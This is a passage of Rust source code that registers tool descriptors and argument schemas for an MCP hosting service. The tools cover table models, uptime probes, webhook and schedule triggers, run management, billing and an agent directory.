        // row count, candidate primary key, detected foreign keys, and
        // suggested measures/dimensions. Refreshes after `append`/`create`
        // (requirement 5); never blocks on a stale recompute.
        Tool::new(
            "host.table.describe",
            "Return the generated semantic model for a declared table: per column its \
             inferred type, null share, distinct count, min/max or top values, and role \
             (key|category|measure|date|id|text); per table its row count, candidate \
             primary key, detected foreign keys, and suggested measures/dimensions. \
             Refreshes after append/create within 30s; a call right after a write returns \
             the previous model with stale: true rather than blocking.",
            host_schema(
                json!({
                    "table": {"type": "string", "description": "Name of the declared table to describe."},
                }),
                &["table"],
            ),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_07() -> Vec<Tool> {
    vec![
        // PRD-mcphost-table-semantic-model requirement 6: an agent
        // annotation that survives refresh -- `describe` merges it back
        // in (annotation wins over inference for `role`) on every call.
        Tool::new(
            "host.table.model_set",
            "Annotate a declared table or one of its columns -- the next describe merges this \
             back in (an annotation's role wins over the inferred one; unit/description are \
             added; hidden marks a column to omit from a summary). key must be one of role, \
             unit, description, hidden.",
            host_schema_checked(
                json!({
                    "table": {"type": "string", "description": "Name of the declared table to annotate."},
                    "column": {
                        "type": "string",
                        "description": "Column name to annotate; omit for a table-level annotation.",
                    },
                    "key": {
                        "type": "string",
                        "enum": crate::tables_model::ANNOTATION_KEYS,
                        "description": "One of role, unit, description, hidden.",
                    },
                    "value": {"type": ANY_JSON_TYPES, "description": "The annotation's value."},
                }),
                &["table", "key", "value"],
            ),
        ),
        Tool::new(
            "host.table.models",
            "List every declared table that has a computed semantic model, each with its \
             version, staleness, row count and when it was last computed.",
            host_schema(json!({}), &[]),
        ),
        // PRD-mcphost-table-concept-graph requirement 3: the tenant's
        // tables joined into one graph -- nodes are tables (kind: table)
        // and columns (kind: key|id|measure|category|date|text), edges are
        // column_of/foreign_key/same_name, each carrying its own evidence.
        // Rebuilt by the same tick that refreshes host.table.describe's
        // models (requirement 2), within the same 30s window.
        Tool::new(
            "host.table.graph",
            "Return this tenant's table concept graph: nodes are tables and columns, edges are \
             column_of/foreign_key/same_name with evidence. Omit table for the whole graph, or \
             give one to get the k_hop_neighbors subgraph around it (hops 1-3, default 1). \
             stale is true between a write and the next tick's rebuild.",
            host_schema(
                json!({
                    "table": {"type": "string", "description": "Table to center the subgraph on; omit for the whole graph."},
                    "hops": {"type": "integer", "description": "How many hops to expand around table, 1-3; default 1."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-table-concept-graph requirement 4: the ready-to-run
        // join clause between two tables, with its own evidence and
        // confidence (1.0 for an all-foreign-key path, the product of edge
        // weights otherwise), or no_path with each table's key/id
        // candidate columns when nothing connects them.
        Tool::new(
            "host.table.join_paths",
            "Return up to three shortest join paths between two declared tables, each with its \
             own steps, a ready sql_join clause and a confidence (1.0 for an all-foreign-key \
             path). Returns no_path: true with each table's key/id candidate columns when \
             nothing connects them.",
            host_schema(
                json!({
                    "from": {"type": "string", "description": "Table to start the join path from."},
                    "to": {"type": "string", "description": "Table to find a join path to."},
                }),
                &["from", "to"],
            ),
        ),
        // PRD-mcphost-uptime-probe-recipe-green requirement 1: host-side
        // uptime probes -- the free-plan path the python `probe` recipe's
        // `network: "public"` gate closes.
        Tool::new(
            "host.uptime.create",
            "Watch 1-20 URLs with no server and no plan upgrade: creates a table of targets, a \
             host-side probe (3 s per target, same host rules as the http kind -- no sandbox \
             egress), a status tool named `name` and one schedule at max(every_s, the plan's \
             schedule_min_interval_s), then runs the probe once and returns {status_tool, \
             schedule_id, every_s, next_fire_unix, first_result: {columns, rows, text}}. Call \
             the status tool (host.tool_call name=<name>) for the latest table; `text` is an \
             aligned table to show a human. An every_s below the plan floor is raised to it \
             and the response carries data.clamped_to.",
            host_schema(
                json!({
                    "name": {"type": "string", "pattern": crate::uptime::NAME_PATTERN, "description": "Name of the status tool to create; also names the <name>_targets table and the <name>_probe tool."},
                    "urls": {"type": "array", "minItems": 1, "maxItems": crate::uptime::TARGETS_MAX, "items": {"type": "string"}, "description": "1-20 URLs to probe with GET; a 2xx/3xx answer is up."},
                    "every_s": {"type": "integer", "description": "Probe interval in seconds; default 300, raised to the plan's floor (pro: 60)."},
                }),
                &["name", "urls"],
            ),
        ),
        // PRD-mcphost-webhook-inbox-one-call R1: a webhook inbox in one call.
        Tool::new(
            "host.webhook_inbox.create",
            "Create a webhook inbox in one call: publishes the reader tool `name`, sets one \
             webhook trigger bound to it and returns {url, secret, tool, trigger_id, wait: \
             {tool: \"host.msg.wait\", args}, next}. POST a signed body to url; within seconds \
             host.tool_call(name=<name>) lists the last 50 events and host.msg.wait(**wait.args) \
             returns a message whose data.event_id names the event. Idempotent by name: a repeat \
             returns the same url and no secret unless rotate is true. Refused with plan_limit \
             (data.limit) at the plan's event_triggers_max.",
            host_schema(
                json!({
                    "name": {"type": "string", "pattern": crate::drafter::TOOL_NAME_REGEX, "description": "Inbox name; also the reader tool's name (^[a-z][a-z0-9_]{1,40}$)."},
                    "verify": {"type": "string", "enum": crate::webhook_inbox::VERIFY_SCHEMES, "description": "How a POST is signed; default hmac (X-Mcphost-Signature: sha256=<hex hmac of the body>)."},
                    "rotate": {"type": "boolean", "description": "On an existing inbox, mint and return a new secret; the url never changes."},
                }),
                &["name"],
            ),
        ),
        // PRD-mcphost-host-doctor-tool R2: recent failed calls, grouped.
        Tool::new(
            "host.doctor",
            "What has been going wrong: this tenant's newest failed calls grouped by error \
             family, each group with the next concrete step. Returns {window: {calls, failed, \
             first_ts, last_ts}, groups: [{code, family, class, count, tools, last_ts, \
             first_source_line?, line?, next}]} biggest group first; tool_exception groups carry \
             the tool-source line of the newest failure; oauth_issuers: {rows, invalid: [{id, tenant_id, reason}]} reports stored OAuth issuer rows the discovery documents omit (the admin key sees every tenant's rows); tenant_lifecycle: {subject, policy, idle_days?, expires_at_unix} says whether idle expiry applies to this tenant (synthetic implicit unclaimed, or external unclaimed: policy external_unclaimed with idle_since_unix, warn_at_unix, expires_at_unix, purge_at_unix, warned_unix, warn_address_masked) and when. No failed calls: groups: [] and a next \
             saying so (hint: host.quickstart when the tenant has no tools yet). The admin key \
             may pass tenant: <namespace>; a tenant key naming another tenant is forbidden.",
            host_schema(
                json!({
                    "limit": {"type": "integer", "minimum": 1, "maximum": 200, "description": "How many of the newest failed calls to group (default 50)."},
                    "tool": {"type": "string", "description": "Only this tool's failures."},
                    "since_s": {"type": "integer", "minimum": 1, "description": "Only failures from the last this-many seconds."},
                    "tenant": {"type": "string", "description": "A tenant namespace; admin key only (a tenant key may name only itself)."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-call-trace-replay R5/R6: what the host saw for one call.
        Tool::new(
            "host.call_trace",
            "Read one tool call exactly as the host saw it, by the call_id a host.tool_call / \
             host.tool_test / host.tool_run result carries: {call_id, tool, started_at, outcome, \
             error_code?, line?, source_line?, request: {tool, args} (secret values masked), \
             stdout_tail, stderr_tail (last 4 KiB each), timings: {queue_ms, runner_start_ms, \
             args_ms, tool_code_ms, serialize_ms}}. Pass replay: {args: {...}} to merge those \
             arguments over the recorded ones and dry-run the same tool (host.tool_test \
             semantics, delivered: false); the response then also carries replay: {result, \
             verdict, diff: {ok: [before, after], error_code: [before, after]}}. A recorded \
             argument still masked as *** is refused with replay_needs_secret naming the key. \
             Traces keep the newest 200 calls per tenant for 24 hours; an unknown or expired id \
             is trace_not_found, another tenant's id is forbidden.",
            host_schema(
                json!({
                    "call_id": {"type": "string", "description": "The call_id a tool-call result returned."},
                    "replay": {
                        "type": "object",
                        "description": "Dry-run the recorded call again with these argument edits.",
                        "properties": {
                            "args": {"type": "object", "description": "Arguments merged over the recorded request.args."},
                        },
                    },
                }),
                &["call_id"],
            ),
        ),
        // PRD-mcphost-table-concept-graph requirement 5: up to five
        // template-generated, parse-checked questions over one table, each
        // runnable unchanged under host.table.query.
        Tool::new(
            "host.table.next_questions",
            "Return up to five suggested next questions over a declared table as \
             {question, sql, connected_via}: total of a measure by a category, a measure over \
             a date column, top 10 ids by a measure, a measure by a category on a joined table, \
             and count of rows by category -- whichever templates this table's roles support. \
             Every sql runs unchanged under host.table.query.",
            host_schema(
                json!({
                    "table": {"type": "string", "description": "Table to suggest next questions for."},
                    "limit": {"type": "integer", "description": "Max questions to return, 1-5; default 5."},
                }),
                &["table"],
            ),
        ),
        // PRD-mcphost-runs-and-jobs P0 requirement 7: the ledger's own
        // tenant-facing tools, alongside host.state.* above.
        Tool::new(
            "host.runs.get",
            "Read one run's status, progress and (once done) result by id -- the same run \
             a host.tool_call(..., async=true) or a scheduled/triggered execution created.",
            host_schema(
                json!({
                    "run_id": {"type": "string", "description": "The run id to read."},
                    "as_fixtures": {
                        "type": "boolean",
                        "description": "Also return `fixtures` ({\"<step>\": <child result>}) built from a chain \
                            run's child rows, ready to pass to host.tool_test's `fixtures`; steps whose result \
                            exceeds one part are listed under `truncated`.",
                    },
                    "include_children": {
                        "type": "boolean",
                        "description": "Accepted for parity with host.runs.list; host.runs.get always \
                            returns the run's direct children under `children`.",
                    },
                }),
                &["run_id"],
            ),
        ),
        Tool::new(
            "host.runs.list",
            format!(
                "List this tenant's recent runs, newest first, optionally filtered by tool, \
                 status ({status}), trigger ({trigger}), end_user_subject (the end user, if \
                 any, the run ran as), or verdict ({verdict}, the run's own budget.verdict). \
                 A chain's own composed step runs (trigger: \"composition\") \
                 are excluded by default -- pass parent_run_id, trigger: \"composition\", or \
                 include_children: true to see them. include_result: true inlines each terminal \
                 row's result when it fits one part, so a poller reading trigger=\"event\" runs \
                 doesn't need a second host.runs.get per row.",
                status = crate::run_enums::RunStatus::names().join("|"),
                trigger = crate::run_enums::RunTrigger::names().join("|"),
                verdict = crate::budget::Verdict::names().join("|"),
            ),
            host_schema_checked(
                json!({
                    "tool": {"type": "string", "description": "Only runs of this tool name."},
                    "status": crate::run_enums::RunStatus::schema_property(),
                    "trigger": crate::run_enums::RunTrigger::schema_property(),
                    "end_user_subject": {
                        "type": "string",
                        "description": "Only runs that ran as this end user's subject.",
                    },
                    "parent_run_id": {
                        "type": "string",
                        "description": "Only the composed child runs of this parent run id.",
                    },
                    "include_children": {
                        "type": "boolean",
                        "description": "Include composed child runs (trigger: \"composition\") \
                             alongside top-level ones; default false.",
                    },
                    "verdict": crate::budget::Verdict::schema_property(),
                    "include_result": {
                        "type": "boolean",
                        "description": "Inline each terminal row's result when it fits one part \
                            (same value host.runs.get returns), null otherwise; default false \
                            keeps every row's result null. Clamps limit to 50.",
                    },
                    "limit": {
                        "type": "integer",
                        "description": "Max runs to return; default 20, clamped to 50 when \
                            include_result is true (200 otherwise).",
                    },
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.runs.cancel",
            "Stop a queued or running job: its sandbox process is killed within ~2s and the \
             run reads cancelled. A run that already finished fails with run_not_cancellable.",
            host_schema(
                json!({
                    "run_id": {"type": "string", "description": "The run id to cancel."},
                }),
                &["run_id"],
            ),
        ),
        Tool::new(
            "host.runs.purge",
            "Delete the stored results of every done run finished at or before before_unix; \
             each then reads done with result: null, purged: true. Frees state_bytes_max \
             quota the results were counted against.",
            host_schema(
                json!({
                    "before_unix": {
                        "type": "integer",
                        "description": "Purge results of runs finished at or before this unix timestamp.",
                    },
                }),
                &["before_unix"],
            ),
        ),
        Tool::new(
            "host.runs.wait",
            format!(
                "Long-poll one run until it finalizes, until: {{counter, gte}} is reached, or \
                 timeout_s elapses (max {}s), returning its current status either way -- for a \
                 client with no polling loop of its own.",
                crate::longpoll::WAIT_MAX_S
            ),
            host_schema(
                json!({
                    "run_id": {"type": "string", "description": "The run id to wait on."},
                    "timeout_s": {
                        "type": "integer",
                        "description": format!("Max seconds to wait, capped at {}; default {}.", crate::longpoll::WAIT_MAX_S, crate::longpoll::WAIT_DEFAULT_S),
                    },
                    "until": {
                        "type": "object",
                        "description": "{counter: <name>, gte: <n>} -- return as soon as that \
                            counter reaches n, even while the run is still running.",
                    },
                }),
                &["run_id"],
            ),
        ),
        // PRD-mcphost-run-result-overflow-to-state P0 requirement 1/4: a
        // run's result is never rejected for size -- it lives in state as
        // one or more parts, and this reads any one of them by index, the
        // same read path whether the whole result fit inline (parts: 1) or
        // overflowed into several.
        // PRD-mcphost-run-result-overflow-to-state P0 requirement 3: a
        // structured, unthrottled counterpart to the sandbox's own
        // free-text `mcphost.progress(pct, msg)` -- callable by id, so a
        // caller outside the running tool's own process (an orchestrator
        // polling a bulk job) can post/read progress too.
        Tool::new(
            "host.progress",
            "Report (or merge in) counters and/or pct/msg on a run, by id. Each named counter \
             (items_processed, items_total, bytes_out, custom.<k>) is monotonic on its own -- a \
             lower value than what's already stored fails validation with nothing written. \
             Read back via host.runs.get/wait/list's counters field.",
            host_schema(
                json!({
                    "run_id": {"type": "string", "description": "The run id to report progress on."},
                    "pct": {"type": "integer", "description": "0-100 percent complete, free text."},
                    "msg": {"type": "string", "description": "A free-text progress message."},
                    "counters": {
                        "type": "object",
                        "description": "items_processed?, items_total?, bytes_out?, custom?: {k: number} -- each key monotonic.",
                    },
                }),
                &["run_id"],
            ),
        ),
        Tool::new(
            "host.runs.part",
            "Read part n of a run's result (host.runs.get/wait inline only part 0). A run \
             whose whole result fit inline reads back parts: 1, n: 0 with the full result. \
             n past the last part fails with not_found.",
            host_schema(
                json!({
                    "run_id": {"type": "string", "description": "The run id to read a part of."},
                    "n": {"type": "integer", "description": "The 0-based part index; default 0."},
                }),
                &["run_id"],
            ),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_08() -> Vec<Tool> {
    vec![
        // PRD-mcphost-job-timeline-tool R1.
        Tool::new(
            "host.job.timeline",
            "Step-by-step timeline of one run, from the rows the host keeps: {run, steps: [{step, \
             tool, run_id, started_unix, finished_unix, duration_ms, status, error_class, \
             error_family, attempts, bytes_out}], totals: {steps, done, error, running, skipped, \
             bytes_out, wall_ms}}. A chain gives one entry per step in step order; any other run \
             gives one entry; a run still going shows its in-flight step as status running with \
             finished_unix null. error_family names the error code's family (upstream, compose, \
             args, tool, budget, host, other).",
            host_schema(
                json!({
                    "run_id": {"type": "string", "description": "The run id to read the timeline of."},
                    "format": {
                        "type": "string",
                        "enum": crate::timeline::FORMATS,
                        "description": "json (default) or text: {format, text} with one line per step and a totals line."
                    }
                }),
                &["run_id"],
            ),
        ),
        // PRD-mcphost-schedules P0 requirement 2: schedule triggers,
        // alongside host.runs.* above -- a schedule's own firings show up
        // there as `trigger: "schedule"` runs.
        Tool::new(
            "host.trigger.set",
            "Run a published tool on a cron schedule (5-field: minute hour day-of-month month \
             day-of-week, UTC), give it a public webhook URL (kind=\"event\"): a signed POST to \
             that URL runs the tool with the event as its argument, fire it whenever this tenant \
             receives a message (kind=\"message\"): the tool runs with the message envelope as \
             its argument, or give it an inbound-inbox URL (kind=\"webhook\"): a verified POST \
             lands as a row in state table inbox_<name> and fires the tool with that row as its \
             argument -- the response carries {url, secret} once (host.trigger.get afterwards \
             never returns the secret again). name is this trigger's identity, unique per \
             tenant (default \"<kind>:<tool>\"): calling set again with the same name updates \
             that trigger in place (same id, same hook URL, next_unix recomputed for a changed \
             schedule) instead of creating a duplicate -- safe to re-run a setup script any \
             number of times -- and returns {created: false, changed: [...changed fields]}; a \
             name that already names a different kind fails trigger_kind_mismatch. Each \
             firing/delivery is a run visible in \
             host.runs.list(trigger=\"schedule\"|\"event\"|\"message\"|\"webhook\"). Refuses \
             schedules_max (trigger_quota_exceeded, shared by schedule and webhook triggers), \
             event_triggers_max (shared by event and message triggers) or a too-short schedule \
             interval (trigger_interval_too_short) on create only -- an update never consumes a \
             slot; an invalid expression or verify config fails trigger_invalid naming the field.",
            host_schema_extra(
                json!({
                    "tool": {"type": "string", "description": "The published tool this trigger runs."},
                    "kind": {"type": "string", "description": "\"schedule\" (default), \"event\", \"message\" or \"webhook\"."},
                    "schedule": {
                        "type": "string",
                        "description": "kind=\"schedule\": 5-field cron expression (minute hour \
                            day-of-month month day-of-week), UTC. Supports *, lists, ranges and steps.",
                    },
                    "name": {
                        "type": "string",
                        "description": "This trigger's identity, unique per tenant (default \
                            \"<kind>:<tool>\"); re-running set with the same name updates that \
                            trigger in place instead of creating a duplicate. kind=\"webhook\": \
                            also becomes the inbox_<name> state table each accepted delivery is \
                            stored in.",
                    },
                    "verify": {
                        "type": ["string", "object"],
                        "description": "kind=\"event\": either {scheme: \"hmac-sha256\"|\
                            \"hmac-sha1\"|\"token\"|\"none\", header, secret (a host.secret_set \
                            name), prefix?, timestamp_header?, tolerance_s?, allow_unverified? \
                            (required true for scheme \"none\")}, or a preset string -- \"github\" \
                            (hmac-sha256 over X-Hub-Signature-256, prefix sha256=, dedupe_header \
                            defaulting to X-GitHub-Delivery) or \"stripe\" (hmac-sha256 t=,v1= over \
                            Stripe-Signature) -- paired with the top-level secret argument below. \
                            kind=\"webhook\": a plain string, one of \"hmac\" (default; checks \
                            X-Mcphost-Signature: sha256=<hex>), \"none\", or \"stripe\" (checks \
                            Stripe-Signature the way Stripe itself signs, using the same generated \
                            secret).",
                    },
                    "secret": {
                        "type": "string",
                        "description": "kind=\"event\" with a verify preset string (\"github\"/\
                            \"stripe\") only: the host.secret_set name to sign with.",
                    },
                    "dedupe_header": {
                        "type": "string",
                        "description": "kind=\"event\": a header (e.g. X-GitHub-Delivery) whose \
                            repeated value within 24h answers 202 with the original run id instead \
                            of running again. Defaults to X-GitHub-Delivery for the \"github\" \
                            verify preset.",
                    },
                    "from": {
                        "type": "string",
                        "description": "kind=\"message\": only fire for messages from this \
                            address (@handle or t_... namespace); omit to fire for any sender.",
                    },
                    "channel_id": {
                        "type": "string",
                        "description": "kind=\"message\": scope this trigger to one group \
                            channel's posts (host.channel.open's channel_id) instead of \
                            ordinary host.msg.send/reply deliveries.",
                    },
                    "args": {"type": "object", "description": "Arguments passed to the tool on each firing/delivery (kind=\"schedule\"/\"event\" only -- a message trigger's whole argument is the message envelope and a webhook trigger's whole argument is the stored inbox row)."},
                    "tz": {"type": "string", "description": "kind=\"schedule\" P1: only \"UTC\" (or omitted) works today."},
                }),
                &["tool"],
                // kind=\"event\" needs `verify` (hooks::set_event_trigger).
                json!({"allOf": [{"if": {"properties": {"kind": {"const": "event"}}, "required": ["kind"]}, "then": {"required": ["verify"]}}]}),
            ),
        ),
        Tool::new(
            "host.trigger.list",
            "List this tenant's triggers (optionally filtered by tool), each with next_unix, \
             last_run_id and last_status (schedule), url/verify/unverified (event), or \
             url/name/verify with no secret (webhook).",
            host_schema(
                json!({"tool": {"type": "string", "description": "Only triggers on this tool name."}}),
                &[],
            ),
        ),
        Tool::new(
            "host.trigger.get",
            "Read one trigger's current schedule, next_unix, last_run_id and last_status.",
            host_schema_any(
                json!({
                    "id": {"type": "string", "description": "The trigger id."},
                    "name": {"type": "string", "description": "The trigger's name, instead of id."},
                }),
                &[],
                &["id", "name"],
            ),
        ),
        Tool::new(
            "host.trigger.pause",
            "Stop a trigger from firing until resumed; still counts toward schedules_max.",
            host_schema_any(
                json!({
                    "id": {"type": "string", "description": "The trigger id."},
                    "name": {"type": "string", "description": "The trigger's name, instead of id."},
                }),
                &[],
                &["id", "name"],
            ),
        ),
        Tool::new(
            "host.trigger.resume",
            "Re-enable a paused trigger; if its scheduled time already passed, the next tick \
             fires it once (a missed firing is never replayed).",
            host_schema_any(
                json!({
                    "id": {"type": "string", "description": "The trigger id."},
                    "name": {"type": "string", "description": "The trigger's name, instead of id."},
                }),
                &[],
                &["id", "name"],
            ),
        ),
        Tool::new(
            "host.trigger.remove",
            "Delete a trigger outright (frees its schedules_max slot, unlike pause).",
            host_schema_any(
                json!({
                    "id": {"type": "string", "description": "The trigger id."},
                    "name": {"type": "string", "description": "The trigger's name, instead of id."},
                }),
                &[],
                &["id", "name"],
            ),
        ),
        Tool::new(
            "host.trigger.fire",
            "Run a schedule once right now, for testing -- recorded as trigger: \"schedule\" with \
             manual: true, independent of next_unix or pause state.",
            host_schema_any(
                json!({
                    "id": {"type": "string", "description": "The trigger id."},
                    "name": {"type": "string", "description": "The trigger's name, instead of id."},
                }),
                &[],
                &["id", "name"],
            ),
        ),
        // PRD-mcphost-scheduled-job-receipts R2: one call answers "is my
        // schedule healthy?".
        Tool::new(
            "host.schedule_receipts",
            "A trigger's run receipts, newest first, with a summary: {rows: [{trigger_id, tool, \
             run_id, source, started_unix, duration_ms, status, error_code, output_excerpt}], \
             summary: {runs, ok, failed, streak_failed, last_ok_unix, last_error, next_fire_unix}}. \
             Address one trigger with trigger_id, or every trigger on a tool with tool. Three \
             failures in a row send one inbox message from @host until the next success.",
            host_schema(
                json!({
                    "trigger_id": {"type": "string", "description": "The trigger id."},
                    "tool": {"type": "string", "description": "Every trigger on this tool."},
                    "limit": {"type": "integer", "minimum": 1, "maximum": 50, "description": "Rows to return (default 20, at most 50)."},
                    "since_unix": {"type": "integer", "description": "Only receipts started at or after this unix time."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-inbound-events P0 requirement 3: an event trigger's
        // own dry-run and re-run tools, alongside host.trigger.fire above.
        Tool::new(
            "host.trigger.test",
            "Dry-run an event trigger's verify config against a payload you supply, without \
             exposing its real URL -- verifies the signature exactly as POST /hooks/... would, \
             then runs the tool with the event as its argument. On a message trigger, runs the \
             tool with a synthetic envelope (test: true, no messages row created). On a webhook \
             trigger, builds and self-signs a synthetic body exactly like a real sender would, \
             then stores and fires it through the same path POST /hook/... uses (one inbox row, \
             one run). The run is marked test: true. PRD-mcphost-dry-run-side-effects: the fired \
             tool's own writes are rolled back and reported under dry_run, nothing delivered. A \
             wrong signature fails signature_invalid, naming the header it checked.",
            host_schema_any(
                json!({
                    "id": {"type": "string", "description": "The event, message or webhook trigger id."},
                    "name": {"type": "string", "description": "The trigger's name, instead of id."},
                    "body": {"type": ANY_JSON_TYPES, "description": "kind=\"event\"/\"webhook\": the payload to verify and run with -- any JSON value. kind=\"message\": the synthetic envelope's body text."},
                    "headers": {"type": "object", "description": "kind=\"event\": header name -> string value, e.g. {\"X-Hub-Signature-256\": \"sha256=...\"}."},
                    "from": {"type": "string", "description": "kind=\"message\": the synthetic envelope's from address; default \"@test\"."},
                    "data": {"type": ANY_JSON_TYPES, "description": "kind=\"message\": the synthetic envelope's data payload."},
                }),
                &[],
                &["id", "name"],
            ),
        ),
        Tool::new(
            "host.trigger.replay",
            "Re-run a past event- or message-triggered run's exact stored event/envelope (no \
             re-verification -- the original delivery already passed it). The new run's \
             trigger_ref names the original run id. For a webhook trigger, pass id (the trigger) \
             and row_id (an inbox_<name> row id, e.g. from POST /hook/...'s own response or \
             host.state.query) instead of run_id -- a paused delivery has no run to replay from. \
             Pass dead_letter_id (from host.trigger.dead_letters) to re-deliver a refused or \
             failed event with its stored body and headers, skipping the rate limit and the \
             signature check; every replay is a new run, never deduped.",
            host_schema_any(
                json!({
                    "run_id": {"type": "string", "description": "The event- or message-triggered run id to replay."},
                    "dead_letter_id": {"type": "string", "description": "A dl_ id from host.trigger.dead_letters: re-run that letter's stored event."},
                    "id": {"type": "string", "description": "kind=\"webhook\" only: the trigger id (paired with row_id)."},
                    "name": {"type": "string", "description": "kind=\"webhook\" only: the trigger's name, instead of id (paired with row_id)."},
                    "row_id": {"type": "integer", "description": "kind=\"webhook\" only: the inbox_<name> row id to replay (paired with id)."},
                }),
                &[],
                &["run_id", "dead_letter_id", "row_id"],
            ),
        ),
        Tool::new(
            "host.trigger.dead_letters",
            crate::deadletters::tool_description(),
            host_schema(
                json!({
                    "trigger": {"type": "string", "description": "Only this trigger's letters (id or name)."},
                    "limit": {"type": "integer", "minimum": 1, "maximum": crate::deadletters::LIST_LIMIT_MAX, "description": "Letters to return, newest first; default 50."},
                    "since": {"type": "integer", "description": "Only letters received at or after this unix time."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "billing.plans",
            "The plan catalog (price and quotas per plan) and whether Stripe billing is \
             configured on this host. Anonymous callers get the same answer as tenants.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "billing.status",
            "This tenant's plan, usage against each quota, and when the daily call quota \
             resets.",
            host_schema(json!({}), &[]),
        ),
        Tool::new(
            "billing.checkout",
            "Create (or reuse an open one for the same plan) a Stripe Checkout URL to \
             upgrade this tenant, defaulting to the pro plan. Returns billing_unavailable \
             if this host has no Stripe key configured -- call billing.plans first to check.",
            host_schema(
                json!({
                    "plan": {"type": "string", "description": "Which plan to check out; default: pro."},
                    "source": {
                        "type": "string",
                        "enum": crate::billing::KNOWN_CHECKOUT_SOURCES,
                        "description": "Which refusal started this checkout (e.g. calls_per_day, \
                            tools_max, secrets_max), or manual; default: manual. Echoed back in the \
                            response and recorded on the eventual payment's ledger row.",
                    },
                }),
                &[],
            ),
        ),
        // PRD-mcphost-agent-directory: every tenant is addressable by
        // namespace with zero setup; a handle is optional, unique, and
        // claimable once.
        Tool::new(
            "host.agent.whoami",
            "Return this tenant's own agent-directory address: namespace, handle (if claimed), \
             display name, contact_policy and plan. Never a key hash, billing field, or call log.",
            host_schema(json!({}), &[]),
        ),
    ]
}

#[inline(never)]
fn host_tools_part_09() -> Vec<Tool> {
    vec![
        Tool::new(
            "host.agent.profile_set",
            "Claim or update this tenant's agent-directory card: an optional unique @handle \
             (^[a-z][a-z0-9_]{2,31}$, stored lower-case), a description, up to 16 tags, a \
             contact_policy (open, contacts, or closed), and whether host.* results carry a \
             next hint. Every argument is optional and, if omitted, leaves that field \
             unchanged; an explicit null clears handle or description. A taken handle fails \
             with handle_taken (names no one); a reserved one fails with handle_reserved.",
            host_schema(
                json!({
                    "handle": {
                        "type": ["string", "null"],
                        "pattern": crate::agents::HANDLE_PATTERN,
                        "description": "Unique handle to claim, e.g. \"indexer\" (without the @); \
                            null clears it.",
                    },
                    "description": {
                        "type": ["string", "null"],
                        "description": "Short blurb shown to other agents via lookup/search; \
                            up to 512 bytes; null clears it.",
                    },
                    "tags": {
                        "type": "array",
                        "maxItems": crate::agents::MAX_TAGS,
                        "items": {"type": "string"},
                        "description": "Up to 16 tags of up to 32 bytes each, for host.agent.search.",
                    },
                    "contact_policy": {
                        "type": "string",
                        "enum": crate::agents::CONTACT_POLICIES,
                        "description": "What contact this tenant accepts; enforced by the inbox PRD.",
                    },
                    "hints": {
                        "type": "boolean",
                        "description": "false permanently stops host.* results from carrying a \
                            next hint for this tenant; true turns it back on. Omit to leave \
                            unchanged (default true).",
                    },
                    "welcome_back": {
                        "type": "boolean",
                        "description": "false permanently stops a new session's first result from \
                            carrying this tenant's welcome_back envelope; true turns it back on. \
                            Omit to leave unchanged (default true).",
                    },
                }),
                &[],
            ),
        ),
        Tool::new(
            "host.agent.lookup",
            "Resolve another agent's namespace or @handle to its public card (address, handle, \
             display_name, description, tags, contact_policy, last_seen, source_class). Unknown, \
             disabled, and deleted addresses all return the identical agent_not_found error.",
            host_schema(
                json!({
                    "address": {
                        "type": "string",
                        "description": "An @handle (e.g. \"@indexer\") or a bare namespace (t_...).",
                    },
                }),
                &["address"],
            ),
        ),
        Tool::new(
            "host.agent.search",
            "Find agents by exact tag or a case-insensitive substring of handle, display name, \
             or description. Disabled tenants are excluded. Ordered by handle (unclaimed last), \
             then namespace; page with cursor from the previous response.",
            host_schema(
                json!({
                    "query": {"type": "string", "description": "Substring to match; omit for no text filter."},
                    "tag": {"type": "string", "description": "Exact tag to match; omit for no tag filter."},
                    "limit": {"type": "integer", "description": "Max results per page, up to 50; default 50."},
                    "cursor": {
                        "type": "string",
                        "description": "Opaque cursor from a previous host.agent.search response's \
                            cursor field; omit for the first page.",
                    },
                }),
                &[],
            ),
        ),
        // PRD-mcphost-feedback-tool-and-ledger requirements 2, 3, 5: the one
        // verb that carries free text to the host's humans. Reachable
        // before signup (see the dispatch arm in `call_tool`).
        Tool::new(
            crate::feedback::tool_descriptors()[0].0,
            crate::feedback::tool_descriptors()[0].1,
            host_schema(
                json!({
                    "kind": {
                        "type": "string",
                        "enum": crate::feedback::FeedbackKind::schema_enum(),
                        "description": "What you are telling the host.",
                    },
                    "text": {
                        "type": "string",
                        "minLength": 1,
                        "description": "What you needed or saw; 1 to 2048 bytes after trim.",
                    },
                    "context": {
                        "type": "object",
                        "description": "Optional, at most 1 KB: tool, error_code, free.",
                    },
                }),
                &["kind", "text"],
            ),
        ),
        Tool::new(
            crate::feedback::tool_descriptors()[1].0,
            crate::feedback::tool_descriptors()[1].1,
            host_schema(
                json!({
                    "limit": {"type": "integer", "description": "Max rows, up to 100; default 20."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-example-from-published-tool R1/R4: turn a working tool
        // into a reviewable example proposal, and read its outcome back.
        Tool::new(
            "host.example.propose",
            crate::example_propose::PROPOSE_DESCRIPTION,
            host_schema(
                json!({
                    "tool": {"type": "string", "minLength": 1, "description": "Name of one of your published tools; the example takes its name."},
                    "proof_call": {
                        "type": "object",
                        "description": "The call that proves the tool works: args for the tool and expect, `result.<path> <op> <value>` with op one of ==, !=, contains.",
                        "properties": {
                            "args": {"type": "object", "description": "Arguments for the proof call."},
                            "expect": {"type": "string", "description": "Assertion on the call result, e.g. result.probed == 1."},
                        },
                        "required": ["expect"],
                    },
                    "title": {"type": "string", "minLength": 1, "description": "Example title, 1 to 60 characters."},
                    "summary": {"type": "string", "description": "One-line summary, up to 200 characters; defaults to the tool's description."},
                    "use_case": {
                        "type": "array",
                        "items": {"type": "string", "enum": crate::examples::EXAMPLE_USE_CASES},
                        "minItems": 1,
                        "description": "One or more use-case tags.",
                    },
                    "clients": {
                        "type": "array",
                        "items": {"type": "string", "enum": crate::examples::CLIENT_TAGS},
                        "description": "Clients the example suits; default [\"any\"].",
                    },
                }),
                &["tool", "proof_call", "title", "use_case"],
            ),
        ),
        // PRD-mcphost-example-proof-nightly-and-hide R3: the examples a
        // nightly proof has not hidden, and the fork call that refuses one.
